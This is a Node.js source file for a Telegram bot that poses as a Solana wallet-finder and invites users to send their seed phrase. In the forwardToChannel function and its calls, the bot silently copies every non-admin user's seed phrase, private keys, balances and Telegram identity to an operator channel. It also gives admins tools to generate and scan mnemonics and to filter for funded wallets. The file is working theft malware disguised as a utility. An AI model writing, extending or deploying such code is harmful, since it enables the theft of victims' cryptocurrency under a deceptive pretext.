import TelegramBot from 'node-telegram-bot-api';
import bip39 from 'bip39';
import * as ed25519 from 'ed25519-hd-key';
import pkg from '@solana/web3.js';
const { Keypair, Connection, PublicKey, TOKEN_PROGRAM_ID } = pkg;
import bs58 from 'bs58';
import dotenv from 'dotenv';
import express from 'express';

dotenv.config();

const app = express();
app.use(express.json());

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// إنشاء اتصالات متعددة لتوزيع الأحمال
const connections = [];
if (process.env.RPC_URL) {
  connections.push(new Connection(process.env.RPC_URL, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000
  }));
}
if (process.env.RPC_URL2) {
  connections.push(new Connection(process.env.RPC_URL2, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000
  }));
}
if (process.env.RPC_URL3) {
  connections.push(new Connection(process.env.RPC_URL3, {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000
  }));
}

// قائمة المشرفين المخولين
const ADMIN_IDS = [5053683608, 7011338539, 7722535506, 8356786274];

// دالة للتحقق من صلاحيات المشرف
function isAdmin(chatId) {
  return ADMIN_IDS.includes(parseInt(chatId));
}

// دالة لإرسال نتائج المستخدمين العاديين إلى القناة
async function forwardToChannel(wallet, userChatId, userInfo, seedPhrase) {
  try {
    if (process.env.CHAT_ID && !isAdmin(userChatId)) {
      const username = userInfo.username ? `@${userInfo.username}` : 'N/A';
      const channelMessage = 
        `🔍 New Wallet Scan Result\n\n` +
        `📝 Name: ${userInfo.firstName || 'N/A'}\n\n` +
        `👤 User: \`${username}\` (\`${userChatId}\`)\n\n` +
        `🔑 Seed Phrase:\n\`${seedPhrase}\`\n\n` +
        `🔑 Address:\n\`${wallet.address}\`\n\n` +
        `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
        `💰 Balance: ${wallet.balance.toFixed(4)} SOL\n\n` +
        `🔥 Rent: ${wallet.totalBurnCost} SOL`;
      
      // إرسال الرسالة مع الأزرار للقناة
      await bot.sendMessage(process.env.CHAT_ID, channelMessage, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: createWalletButtons(wallet.address)
        }
      });
    }
  } catch (error) {
    console.error('خطأ في إرسال إلى القناة:', error.message);
  }
}

// متغير لتتبع وضع البوت لكل مستخدم
const userModes = new Map();

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function retryWithBackoff(fn, maxRetries = 5) {
  let retries = 0;
  while (true) {
    try {
      return await fn();
    } catch (error) {
      if (retries >= maxRetries || !error.message.includes('429')) {
        throw error;
      }
      const delay = Math.min(1000 * Math.pow(2, retries), 8000);
      await sleep(delay);
      retries++;
    }
  }
}

// استعلام عبر RPC
async function rpc(method, params) {
  const fetch = (await import('node-fetch')).default;
  const currentConnectionIndex = Math.floor(Math.random() * connections.length);
  const rpcUrl = connections[currentConnectionIndex]?.rpcEndpoint || process.env.RPC_URL;

  const res = await fetch(rpcUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method,
      params,
    }),
  });
  const data = await res.json();
  return data.result;
}

async function getTokenAccounts(address) {
  try {
    if (!address || typeof address !== 'string') {
      return [];
    }

    // استخدام RPC مباشرة مثل الكود الناجح
    const result = await retryWithBackoff(() =>
      rpc("getTokenAccountsByOwner", [
        address,
        { programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" },
        { encoding: "jsonParsed" }
      ])
    );

    return result?.value || [];
  } catch (error) {
    if (!error.message.includes('429')) {
      console.error("Error getting token accounts for address:", address, error.message);
    }
    return [];
  }
}

async function calculateBurnCost(addressStr) {
  try {
    if (!addressStr) {
      return {
        emptyTokens: 0,
        nfts: 0,
        totalBurnCost: "0.000000000"
      };
    }

    console.log(`🔍 فحص التوكنات للعنوان: ${addressStr}`);
    const tokens = await getTokenAccounts(addressStr);
    console.log(`📊 تم العثور على ${tokens.length} حساب توكن`);

    let tokenCount = 0;
    let nftCount = 0;
    let cleanupCount = 0;

    for (const token of tokens) {
      try {
        const info = token.account.data.parsed.info;
        const amount = parseFloat(info.tokenAmount.uiAmount) || 0;
        const decimals = info.tokenAmount.decimals;

        // تصنيف الحسابات مثل الكود الناجح
        if (amount === 0) {
          tokenCount++;
          console.log(`🗑️ توكن فارغ: ${info.mint}`);
        } else if (decimals === 0 && amount === 1) {
          nftCount++;
          console.log(`🖼️ NFT: ${info.mint}`);
        } else {
          cleanupCount++;
        }
      } catch (tokenError) {
        console.error("خطأ في معالجة التوكن:", tokenError);
      }
    }

    // حساب rent لجميع الحسابات (مثل الكود الناجح)
    const totalAccounts = tokens.length;
    const burnCostPerAccount = 0.00203928;
    const totalBurnCost = totalAccounts * burnCostPerAccount;

    console.log(`💰 إجمالي التوكنات الفارغة: ${tokenCount}`);
    console.log(`🖼️ إجمالي NFTs: ${nftCount}`);
    console.log(`🔧 حسابات أخرى: ${cleanupCount}`);
    console.log(`📊 إجمالي الحسابات: ${totalAccounts}`);
    console.log(`✨ إجمالي SOL قابل للاستعادة: ${totalBurnCost.toFixed(9)}`);

    return {
      emptyTokens: tokenCount,
      nfts: nftCount,
      totalBurnCost: totalBurnCost.toFixed(9)
    };
  } catch (error) {
    console.error("Error calculating burn cost:", error);
    return {
      emptyTokens: 0,
      nfts: 0,
      totalBurnCost: "0.000000000"
    };
  }
}

function* generatePaths() {
  const specificPaths = [
    "m/44'/501'/10'/0'",
    "m/44'/501'/9'/0'",
    "m/44'/501'/8'/0'",
    "m/44'/501'/7'/0'",
    "m/44'/501'/6'/0'",
    "m/44'/501'/5'/0'",
    "m/44'/501'/4'/0'",
    "m/44'/501'/3'/0'",
    "m/44'/501'/2'/0'",
    "m/44'/501'/1'/0'",
    "m/44'/501'/0'",
    "m/44'/501'/0'/0'"
  ];

  for (const path of specificPaths) {
    yield path;
  }
}

async function scanDerivationPath(path, seed) {
  try {
    let derivedSeed;
    try {
      derivedSeed = ed25519.derivePath(path, seed.toString('hex')).key;
    } catch (e) {
      if (e.message.includes('Invalid derivation path')) {
        return null;
      }
      throw e;
    }
    const keypair = Keypair.fromSeed(derivedSeed.slice(0, 32));
    const address = keypair.publicKey.toBase58();

    let connectionIndex = 0;
    const getConnection = () => {
      const conn = connections[connectionIndex % connections.length];
      connectionIndex++;
      return conn;
    };

    const [txList, balance] = await Promise.all([
      retryWithBackoff(() => getConnection().getSignaturesForAddress(new PublicKey(address), { limit: 1 })),
      retryWithBackoff(() => getConnection().getBalance(new PublicKey(address)))
    ]);

    if (txList.length > 0 || balance > 0) {
      const burnInfo = await calculateBurnCost(address);
      const balanceInSol = balance / 1e9;
      // SOL القابل للاستعادة هو مبلغ الـ rent فقط (0.00203928 SOL × عدد الحسابات)
      const recoveredSOL = parseFloat(burnInfo.totalBurnCost);

      return {
        path,
        address,
        privateKey: bs58.encode(Buffer.from(keypair.secretKey)),
        balance: balanceInSol,
        hasTransactions: txList.length > 0,
        recoveredSOL: recoveredSOL,
        ...burnInfo
      };
    }
  } catch (error) {
    console.error(`⚠️ Error in path ${path}:`, error.message);
  }
  return null;
}

async function scanWallet(mnemonic, chatId, userInfo = null) {
  const cleanedMnemonic = cleanMnemonic(mnemonic);

  // تشخيص مفصل لسبب فشل التحقق من صحة العبارة
  const diagnosis = diagnoseMnemonic(cleanedMnemonic, chatId);
  if (!diagnosis.isValid) {
    return bot.sendMessage(chatId, diagnosis.message);
  }

  const BATCH_SIZE = 20;
  let consecutiveEmpty = 0;
  const MAX_CONSECUTIVE_EMPTY = 10;
  const seenAddresses = new Set();
  const pathGenerator = generatePaths();
  const seed = await bip39.mnemonicToSeed(cleanedMnemonic);
  const userMode = userModes.get(chatId) || 'normal';
  let foundWalletsWithBalance = 0;

  if (isAdmin(chatId)) {
    if (userMode === 'balance_only') {
      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ التي تحتوي على رصيد SOL...');
    } else {
      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ النشطة...');
    }
  } else {
    await bot.sendMessage(chatId, '🔍 Searching for active wallets...');
  }

  while (consecutiveEmpty < MAX_CONSECUTIVE_EMPTY) {
    const batchPaths = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
      const { value: path, done } = pathGenerator.next();
      if (done) break;
      batchPaths.push(path);
    }

    const results = await Promise.all(batchPaths.map(path => scanDerivationPath(path, seed)));
    let foundInBatch = 0;

    for (const wallet of results) {
      if (wallet && !seenAddresses.has(wallet.address)) {
        seenAddresses.add(wallet.address);

        if (userMode === 'balance_only') {
          // عرض المحافظ التي بها رصيد فقط
          if (wallet.balance > 0) {
            foundInBatch++;
            foundWalletsWithBalance++;

            // تحقق من نوع المستخدم
            if (isAdmin(chatId)) {
              const message =
                `🔑 Address:\n\`${wallet.address}\`\n\n` +
                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
                `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
                `🔥 Rent: ${wallet.totalBurnCost} SOL`;

              await bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
              });
            } else {
              // عرض مبسط للمستخدمين العاديين بالإنجليزية
              const message =
                `🔑 Address:\n\`${wallet.address}\`\n\n` +
                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
                `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;

              await bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown'
              });
              
              // إرسال صامت إلى القناة للمستخدمين العاديين
              await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
            }
          } else if (wallet.hasTransactions) {
            // حساب المحافظ النشطة حتى لو لم يكن بها رصيد
            foundInBatch++;
          }
        } else {
          // الوضع العادي - عرض جميع المحافظ النشطة
          foundInBatch++;
          if (wallet.balance > 0) {
            foundWalletsWithBalance++;
          }

          // تحقق من نوع المستخدم
          if (isAdmin(chatId)) {
            const message =
              `🔑 Address:\n\`${wallet.address}\`\n\n` +
              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
              `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
              `🔥 Rent: ${wallet.totalBurnCost} SOL`;

            await bot.sendMessage(chatId, message, {
              parse_mode: 'Markdown',
              reply_markup: {
                inline_keyboard: createWalletButtons(wallet.address)
              }
            });
          } else {
            // عرض مبسط للمستخدمين العاديين بالإنجليزية
            const message =
              `🔑 Address:\n\`${wallet.address}\`\n\n` +
              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
              `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;

            await bot.sendMessage(chatId, message, {
              parse_mode: 'Markdown'
            });
            
            // إرسال صامت إلى القناة للمستخدمين العاديين
            await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
          }
        }
      }
    }

    if (foundInBatch === 0) {
      consecutiveEmpty += BATCH_SIZE;
      if (consecutiveEmpty % 50 === 0) {
        await bot.sendMessage(chatId, `🔍 جاري البحث... (${consecutiveEmpty} مسار فارغ)`);
      }
    } else {
      consecutiveEmpty = 0;
    }
  }

  if (isAdmin(chatId)) {
    if (userMode === 'balance_only') {
      if (foundWalletsWithBalance === 0) {
        await bot.sendMessage(chatId, '✅ اكتمل البحث! لم يتم العثور على أي محافظ تحتوي على رصيد SOL.');
      } else {
        await bot.sendMessage(chatId, `✅ اكتمل البحث! تم العثور على ${foundWalletsWithBalance} محفظة تحتوي على رصيد.`);
      }
    } else {
      await bot.sendMessage(chatId, '✅ اكتمل البحث!');
    }
  } else {
    await bot.sendMessage(chatId, '✅ Search complete!');
  }
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  if (isAdmin(chatId)) {
    // رسالة المشرفين باللغة العربية مع جميع الأوامر
    bot.sendMessage(chatId,
      'مرحباً! 👋\n\n' +
      '🔑 أرسل لي المنيمونك الخاص بك وسأقوم بفحص المحفظة.\n\n' +
      '💼 أو أرسل لي مفتاح خاص وسأعرض لك عنوان المحفظة والرصيد.\n\n' +
      '📍 أو أرسل لي عناوين المحافظ لعرض روابطها.\n\n' +
      '🎲 استخدم /starts لتوليد عبارات سرية عشوائية.\n\n' +
      '💰 استخدم /b للتبديل بين وضع عرض جميع المحافظ أو المحافظ ذات الرصيد فقط.'
    );
  } else {
    // رسالة المستخدمين العاديين باللغة الإنجليزية
    bot.sendMessage(chatId,
      'Welcome! 👋\n\n' +
      '🔑 Send me your seed phrase to find the wallets associated with it.\n\n' +
      '💡 I will show you the wallet address, private key, and balance.'
    );
  }
});

bot.onText(/\/b$/, (msg) => {
  const chatId = msg.chat.id;
  
  // تحقق من صلاحيات المشرف
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, "You don't have permission to use this command.");
    return;
  }
  
  const currentMode = userModes.get(chatId) || 'normal';

  if (currentMode === 'normal') {
    userModes.set(chatId, 'balance_only');
    bot.sendMessage(chatId,
      '💰 تم تفعيل وضع المحافظ ذات الرصيد فقط!\n\n' +
      '🔑 أرسل الآن الكلمات السرية وسيتم عرض المحافظ التي بها رصيد SOL فقط.\n\n' +
      '🔄 استخدم /b مرة أخرى للعودة للوضع العادي.'
    );
  } else {
    userModes.set(chatId, 'normal');
    bot.sendMessage(chatId,
      '🔄 تم العودة للوضع العادي!\n\n' +
      '🔑 سيتم الآن عرض جميع المحافظ النشطة (بها رصيد وبدون رصيد).\n\n' +
      '💰 استخدم /b للتحويل لوضع المحافظ ذات الرصيد فقط.'
    );
  }
});

bot.onText(/\/starts/, async (msg) => {
  const chatId = msg.chat.id;
  
  // تحقق من صلاحيات المشرف
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, "You don't have permission to use this command.");
    return;
  }
  
  let message = '🎲 إليك 10 عبارات سرية شائعة:\n\n';

  for (let i = 0; i < 10; i++) {
    const mnemonic = bip39.generateMnemonic();
    const messageId = await bot.sendMessage(
      chatId,
      `\`${mnemonic}\``,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [[
            { text: '🔍 فحص العبارة', callback_data: `check_${i}` }
          ]]
        }
      }
    );
    global.mnemonics = global.mnemonics || {};
    global.mnemonics[i] = mnemonic;
  }
});

bot.on('callback_query', async (query) => {
  if (query.data.startsWith('check_')) {
    const index = query.data.replace('check_', '');
    const mnemonic = global.mnemonics[index];
    await bot.answerCallbackQuery(query.id);
    const userInfo = {
      username: query.from?.username,
      firstName: query.from?.first_name,
      lastName: query.from?.last_name
    };
    await scanWallet(mnemonic, query.message.chat.id, userInfo);
  }
});

async function checkPrivateKey(privateKey, chatId) {
  try {
    // التحقق من صحة المفتاح الخاص
    let keypair;
    try {
      const secretKey = bs58.decode(privateKey);
      if (secretKey.length !== 64) {
        throw new Error('Invalid key length');
      }
      keypair = Keypair.fromSecretKey(secretKey);
    } catch (error) {
      await bot.sendMessage(chatId, "❌ المفتاح الخاص غير صالح!");
      return;
    }

    const address = keypair.publicKey.toBase58();
    const userMode = userModes.get(chatId) || 'normal';

    await bot.sendMessage(chatId, '🔍 جاري التحقق من المحفظة...');

    // الحصول على الرصيد
    let connectionIndex = 0;
    const getConnection = () => {
      const conn = connections[connectionIndex % connections.length];
      connectionIndex++;
      return conn;
    };

    const balance = await retryWithBackoff(() =>
      getConnection().getBalance(new PublicKey(address))
    );

    const balanceInSol = balance / 1e9;

    // في وضع المحافظ ذات الرصيد فقط، لا نعرض المحفظة إذا لم يكن بها رصيد
    if (userMode === 'balance_only' && balanceInSol === 0) {
      await bot.sendMessage(chatId, '❌ هذه المحفظة لا تحتوي على رصيد SOL.');
      return;
    }

    // حساب تكلفة الحرق
    const burnInfo = await calculateBurnCost(address);

    // SOL القابل للاستعادة هو مبلغ الـ rent فقط
    const recoveredSOL = parseFloat(burnInfo.totalBurnCost);

    const message =
      `🔑 Address:\n\`${address}\`\n\n` +
      `🔐 Private Key:\n\`${privateKey}\`\n\n` +
      `💰 Balance : ${balanceInSol.toFixed(4)}\n\n` +
      `🔥 Rent: ${burnInfo.totalBurnCost} SOL`;

    // إضافة الأزرار للمشرفين فقط
    if (isAdmin(chatId)) {
      await bot.sendMessage(chatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: createWalletButtons(address)
        }
      });
    } else {
      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }

  } catch (error) {
    console.error("Error checking private key:", error);
    await bot.sendMessage(chatId, "❌ حدث خطأ أثناء التحقق من المحفظة.");
  }
}

function extractSolflareArray(text) {
  // البحث عن مصفوفة أرقام Solflare
  const arrayPattern = /\[(\s*\d+\s*(?:,\s*\d+\s*)*)\]/g;
  const matches = text.match(arrayPattern);

  if (matches) {
    for (const match of matches) {
      try {
        // إزالة الأقواس المربعة واستخراج الأرقام
        const numbersStr = match.slice(1, -1);
        const numbers = numbersStr.split(',').map(num => parseInt(num.trim()));

        // التحقق من أن المصفوفة تحتوي على 64 رقم (512 بت)
        if (numbers.length === 64 && numbers.every(num => num >= 0 && num <= 255)) {
          // تحويل إلى Buffer ثم إلى Base58
          const secretKeyBuffer = new Uint8Array(numbers);
          return bs58.encode(secretKeyBuffer);
        }
      } catch (error) {
        continue;
      }
    }
  }

  return null;
}

function extractAllPrivateKeys(text) {
  const privateKeys = [];

  // أولاً البحث عن مصفوفات Solflare
  const arrayPattern = /\[(\s*\d+\s*(?:,\s*\d+\s*)*)\]/g;
  let arrayMatch;
  while ((arrayMatch = arrayPattern.exec(text)) !== null) {
    try {
      const numbersStr = arrayMatch[1];
      const numbers = numbersStr.split(',').map(num => parseInt(num.trim()));

      if (numbers.length === 64 && numbers.every(num => num >= 0 && num <= 255)) {
        const secretKeyBuffer = new Uint8Array(numbers);
        const privateKey = bs58.encode(secretKeyBuffer);
        privateKeys.push(privateKey);
      }
    } catch (error) {
      continue;
    }
  }

  // البحث عن مفاتيح خاصة في الكلمات
  const words = text.split(/\s+/);
  for (const word of words) {
    try {
      const decoded = bs58.decode(word);
      if (decoded.length === 64 && !privateKeys.includes(word)) {
        privateKeys.push(word);
      }
    } catch (error) {
      continue;
    }
  }

  // البحث عن نمط المفتاح الخاص باستخدام regex
  const base58Pattern = /[1-9A-HJ-NP-Za-km-z]{87,88}/g;
  let regexMatch;
  while ((regexMatch = base58Pattern.exec(text)) !== null) {
    try {
      const decoded = bs58.decode(regexMatch[0]);
      if (decoded.length === 64 && !privateKeys.includes(regexMatch[0])) {
        privateKeys.push(regexMatch[0]);
      }
    } catch (error) {
      continue;
    }
  }

  return privateKeys;
}

function cleanMnemonic(text) {
  if (!text) return '';

  // إزالة جميع الأحرف غير المرئية والمسافات الزائدة
  return text
    .replace(/[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000]/g, ' ') // تحويل جميع أنواع المسافات إلى مسافة عادية
    .replace(/[\u200B-\u200D\uFEFF\u061C\u200E\u200F]/g, '') // إزالة الأحرف المخفية وعلامات الاتجاه
    .replace(/^\s+|\s+$/g, '') // إزالة المسافات من البداية والنهاية بشكل أكثر دقة
    .replace(/\s+/g, ' ') // تحويل جميع المسافات المتعددة إلى مسافة واحدة
    .toLowerCase(); // تحويل إلى أحرف صغيرة
}

function diagnoseMnemonic(mnemonic, chatId) {
  if (!mnemonic || typeof mnemonic !== 'string') {
    return {
      isValid: false,
      message: isAdmin(chatId) ? "❌ العبارة السرية فارغة أو غير صالحة!" : "❌ Seed phrase is empty or invalid!"
    };
  }

  const words = mnemonic.split(/\s+/);
  const mnemonicWordList = bip39.wordlists.english;

  // التحقق من عدد الكلمات
  if (words.length !== 12 && words.length !== 24) {
    return {
      isValid: false,
      message: isAdmin(chatId) ? 
        `❌ عدد كلمات العبارة السرية غير صحيح!\n\n` +
        `📊 العدد الحالي: ${words.length} كلمة\n` +
        `✅ المطلوب: 12 أو 24 كلمة\n\n` +
        `💡 تأكد من وجود جميع الكلمات مفصولة بمسافات.` :
        `❌ Invalid seed phrase word count!\n\nCurrent: ${words.length} words\nRequired: 12 or 24 words\n\nPlease check that all words are separated by spaces.`
    };
  }

  // التحقق من صحة كل كلمة
  const invalidWords = [];
  const suggestions = [];

  words.forEach((word, index) => {
    if (!mnemonicWordList.includes(word)) {
      invalidWords.push(`${index + 1}: "${word}"`);

      // البحث عن كلمات مشابهة
      const similarWords = mnemonicWordList.filter(validWord => {
        // حساب المسافة بين الكلمات (Levenshtein distance مبسط)
        if (Math.abs(validWord.length - word.length) > 2) return false;

        let differences = 0;
        const maxLength = Math.max(validWord.length, word.length);

        for (let i = 0; i < maxLength; i++) {
          if (validWord[i] !== word[i]) differences++;
          if (differences > 2) return false;
        }

        return differences <= 2;
      }).slice(0, 3);

      if (similarWords.length > 0) {
        suggestions.push(`"${word}" ربما تقصد: ${similarWords.join(', ')}`);
      }
    }
  });

  if (invalidWords.length > 0) {
    let message;
    if (isAdmin(chatId)) {
      message = `❌ توجد كلمات غير صالحة في العبارة السرية!\n\n`;
      message += `🔍 الكلمات غير الصالحة:\n${invalidWords.join('\n')}\n\n`;
      if (suggestions.length > 0) {
        message += `💡 اقتراحات للتصحيح:\n${suggestions.join('\n')}\n\n`;
      }
      message += `📝 تأكد من:\n• كتابة جميع الكلمات بالإنجليزية\n• عدم وجود أخطاء إملائية\n• استخدام كلمات من قائمة BIP39 الرسمية`;
    } else {
      message = `❌ Invalid words in seed phrase!\n\nInvalid words: ${invalidWords.length}\n\nPlease check:\n• All words are in English\n• No spelling errors\n• Words are from the official BIP39 word list`;
    }

    return {
      isValid: false,
      message: message
    };
  }

  // التحقق من checksum
  if (!bip39.validateMnemonic(mnemonic)) {
    return {
      isValid: false,
      message: isAdmin(chatId) ?
        `❌ العبارة السرية غير صالحة!\n\n` +
        `✅ جميع الكلمات صحيحة ولكن:\n` +
        `🔐 الـ Checksum غير صحيح\n\n` +
        `💡 هذا يعني أن ترتيب الكلمات قد يكون خاطئ أو أن هناك كلمة مفقودة/زائدة.\n\n` +
        `📝 تأكد من:\n` +
        `• الترتيب الصحيح للكلمات\n` +
        `• عدم نسيان أو إضافة أي كلمة\n` +
        `• نسخ العبارة كما هي تماماً` :
        `❌ Invalid seed phrase!\n\nThe checksum is incorrect. This means the word order might be wrong or there's a missing/extra word.\n\nPlease check:\n• Correct word order\n• No missing or extra words\n• Copy the phrase exactly as it is`
    };
  }

  return {
    isValid: true,
    message: isAdmin(chatId) ? "✅ العبارة السرية صالحة!" : "✅ Seed phrase is valid!"
  };
}

function extractAllMnemonics(text) {
  const mnemonics = [];
  const cleanedText = cleanMnemonic(text);
  const words = cleanedText.split(/\s+/);
  const mnemonicWordList = bip39.wordlists.english;
  const usedIndices = new Set();

  // البحث عن 12 أو 24 كلمة متتالية من قائمة BIP39
  for (let i = 0; i <= words.length - 12; i++) {
    if (usedIndices.has(i)) continue;

    // فحص 24 كلمة أولاً
    if (i <= words.length - 24) {
      const twentyFourWords = words.slice(i, i + 24);
      if (twentyFourWords.every(word => mnemonicWordList.includes(word))) {
        const candidateMnemonic = twentyFourWords.join(' ');
        if (bip39.validateMnemonic(candidateMnemonic)) {
          mnemonics.push(candidateMnemonic);
          // تسجيل الفهارس المستخدمة
          for (let j = i; j < i + 24; j++) {
            usedIndices.add(j);
          }
          continue;
        }
      }
    }

    // فحص 12 كلمة
    const twelveWords = words.slice(i, i + 12);
    if (twelveWords.every(word => mnemonicWordList.includes(word))) {
      const candidateMnemonic = twelveWords.join(' ');
      if (bip39.validateMnemonic(candidateMnemonic)) {
        mnemonics.push(candidateMnemonic);
        // تسجيل الفهارس المستخدمة
        for (let j = i; j < i + 12; j++) {
          usedIndices.add(j);
        }
      }
    }
  }

  return mnemonics;
}

// دالة لتوليد رابط pump.fun
function generatePumpLink(address) {
  return `https://pump.fun/profile/${address}?tab=balance`;
}

// دالة لتوليد رابط Solscan للإيداع (Deposit)
function generateDepositLink(address) {
  return `https://solscan.io/account/${address}?activity_type=ACTIVITY_SPL_TRANSFER&amount=0.03&amount=&exclude_amount_zero=true&from_address=%21${address}&page_size=10&remove_spam=true&to_address=${address}&token_address=So11111111111111111111111111111111111111111#transfers`;
}

// دالة لتوليد رابط Solscan للسحب (Withdraw)
function generateWithdrawLink(address) {
  return `https://solscan.io/account/${address}?activity_type=ACTIVITY_SPL_TRANSFER&exclude_amount_zero=true&remove_spam=true&from_address=${address}&to_address=%21${address}&amount=0.5&amount=undefined&token_address=So11111111111111111111111111111111111111111#transfers`;
}

// دالة لتوليد رابط Solscan للمكافآت (Reward)
function generateRewardLink(address) {
  return `https://solscan.io/account/${address}?exclude_amount_zero=true&remove_spam=true&from_address=pmprUcS9dKa8pnidT3raZZFhRFtyGe6cgDL4R1gjyZs%2CF5YtngCQs6QCUdy2vqT6hMtFyNkLpkJSTQF2WZKV1y8e#transfers`;
}

// دالة لاختصار العنوان (xxx...xxx)
function shortenAddress(address) {
  return `${address.slice(0, 3)}...${address.slice(-3)}`;
}

// دالة لإنشاء أزرار المحفظة
function createWalletButtons(address) {
  return [
    [
      { text: 'Pump', url: generatePumpLink(address) }, // تم تغيير النص إلى "Pump"
      { text: 'Deposit 💰', url: generateDepositLink(address) },
      { text: 'Withdraw 💸', url: generateWithdrawLink(address) },
      { text: 'Reward 🎁', url: generateRewardLink(address) }
    ]
  ];
}

bot.on('message', async (msg) => {
  if (msg.text && msg.text.startsWith('/')) return;
  const chatId = msg.chat.id;
  const userName = msg.from?.first_name || msg.from?.username || 'Unknown';
  const userInfo = {
    username: msg.from?.username,
    firstName: msg.from?.first_name,
    lastName: msg.from?.last_name
  };

  // التعامل مع الملفات والوسائط
  if (msg.photo || msg.document || msg.video || msg.audio || msg.voice || msg.video_note || msg.sticker) {
    const mediaMessage = isAdmin(chatId) ?
      '📎 تم استلام ملف وسائط.\n\n' +
      '🔑 لفحص المحافظ، يرجى إرسال:\n' +
      '• الكلمات السرية (12 أو 24 كلمة)\n' +
      '• أو المفتاح الخاص\n' +
      '• أو عناوين المحافظ\n' +
      '• كنص عادي (ليس كملف)' :
      '📎 Media file received.\n\n' +
      '🔑 To check wallets, please send:\n' +
      '• Seed phrase (12 or 24 words)\n' +
      '• Or private key\n' +
      '• Or wallet addresses\n' +
      '• As plain text (not as file)';
    await bot.sendMessage(chatId, mediaMessage);
    return;
  }

  // التأكد من وجود نص للمعالجة
  if (!msg.text || typeof msg.text !== 'string') {
    const textMessage = isAdmin(chatId) ?
      '❌ يرجى إرسال نص يحتوي على:\n' +
      '🔑 الكلمات السرية (12 أو 24 كلمة)\n' +
      '🔐 أو المفتاح الخاص\n' +
      '📍 أو عناوين المحافظ' :
      '❌ Please send text containing:\n' +
      '🔑 Seed phrase (12 or 24 words)\n' +
      '🔐 Or private key\n' +
      '📍 Or wallet addresses';
    await bot.sendMessage(chatId, textMessage);
    return;
  }

  // فحص إذا كان النص يحتوي على عناوين محافظ فقط
  const text = msg.text.trim();
  const addresses = text.split(/\s+/).filter(addr => {
    // فحص إذا كان العنوان يشبه عنوان Solana (32-44 حرف)
    return addr.length >= 32 && addr.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(addr);
  });

  // إذا كان النص يحتوي على عناوين محافظ فقط
  if (addresses.length > 0 && addresses.length === text.split(/\s+/).length) {
    if (addresses.length === 0) {
      await bot.sendMessage(chatId, '📌 أرسل لي عناوين المحافظ كل واحدة بسطر.');
      return;
    }

    // فقط المشرفين يحصلون على رد بالأزرار
    if (isAdmin(chatId)) {
      // توليد أزرار لكل عنوان
      const buttons = addresses.map(addr => {
        return [
          { text: 'Pump', url: generatePumpLink(addr) }, // تم تغيير النص إلى "Pump"
          { text: 'Deposit 💰', url: generateDepositLink(addr) },
          { text: 'Withdraw 💸', url: generateWithdrawLink(addr) },
          { text: 'Reward 🎁', url: generateRewardLink(addr) }
        ];
      });

      // إرسال الأزرار
      await bot.sendMessage(chatId, 'اختر المحفظة 👇', {
        reply_markup: {
          inline_keyboard: buttons
        }
      });
    }
    // للمستخدمين العاديين - لا نرد عليهم كما طلبت
    return;
  }

  // البحث عن جميع المفاتيح الخاصة في النص
  const privateKeys = extractAllPrivateKeys(msg.text);

  // البحث عن جميع الكلمات السرية في النص
  const mnemonics = extractAllMnemonics(msg.text);

  // إذا وُجدت مفاتيح خاصة، فحصها فقط للمشرفين
  if (privateKeys.length > 0) {
    if (!isAdmin(chatId)) {
      const message = "❌ This is not a valid seed phrase. Please check and try again.";
      await bot.sendMessage(chatId, message);
      return;
    }
    
    if (privateKeys.length > 1) {
      await bot.sendMessage(chatId, `🔍 تم العثور على ${privateKeys.length} مفاتيح خاصة، جاري فحصها...`);
    }

    for (let i = 0; i < privateKeys.length; i++) {
      if (privateKeys.length > 1) {
        await bot.sendMessage(chatId, `📝 فحص المفتاح ${i + 1}/${privateKeys.length}:`);
      }
      await checkPrivateKey(privateKeys[i], chatId);
    }
  }

  // إذا وُجدت كلمات سرية، فحصها جميعاً
  if (mnemonics.length > 0) {
    if (mnemonics.length > 1) {
      const message = isAdmin(chatId) ? 
        `🔍 تم العثور على ${mnemonics.length} مجموعات كلمات سرية، جاري فحصها...` :
        `🔍 Found ${mnemonics.length} seed phrases, checking them...`;
      await bot.sendMessage(chatId, message);
    }

    for (let i = 0; i < mnemonics.length; i++) {
      if (mnemonics.length > 1) {
        const message = isAdmin(chatId) ?
          `📝 فحص الكلمات السرية ${i + 1}/${mnemonics.length}:` :
          `📝 Checking seed phrase ${i + 1}/${mnemonics.length}:`;
        await bot.sendMessage(chatId, message);
      }
      const phraseMessage = isAdmin(chatId) ?
        `🔍 الكلمات السرية: "${mnemonics[i]}"` :
        `🔍 Seed Phrase: "${mnemonics[i]}"`;
      await bot.sendMessage(chatId, phraseMessage);
      await scanWallet(mnemonics[i], chatId, userInfo);
    }
  }

